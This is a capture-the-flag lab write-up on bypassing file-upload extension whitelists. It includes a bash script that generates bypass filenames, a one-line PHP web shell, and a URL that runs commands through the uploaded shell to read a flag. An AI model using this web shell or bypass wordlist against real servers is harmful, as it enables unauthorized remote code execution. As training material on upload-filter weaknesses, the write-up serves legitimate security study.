# Whitelist Filters

The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"

In some cases whitelists may be used to prevent malicious threats for uploading unintended file formats.

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

Lets capture the upload request and fuzz the extension like in the previous exercise.&#x20;

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

Lets also add the following php code to ensure it's being executed:

```php
<?php echo "shell test";?>
```

This time, we'll create our own wordlist. We will adapt the bash script from HTB and add two more extensions ending up with a script like this:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' 'php3' '.phar'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Just paste it on your machine and press enter to execute it, and then copy the content to the Intruder's payload configuration and click `Start attack`.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As we can see from the image above, the requests with a 230 length have the message "File successfully uploaded".

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we need to know if the actual php code was executed. Hide all the columns besides the column "Payload", and copy all it's content to other file so we can have another wordlist.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Go to the main page and open "image" in a new tab.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It looks we may have found a working payload. And don't need to fuzz it anymore. Now let's modify the POST request.

```php
<?php system($_REQUEST['cmd']); ?>
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And it was uploaded! Now let's go the previous URL and modify it to `/shell.phar:.jpg?cmd=id`.

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And it worked! Now lets look for the flag.

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Like in the previous sections the flag is under the root directory.

<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

And here it is, we found our flag!

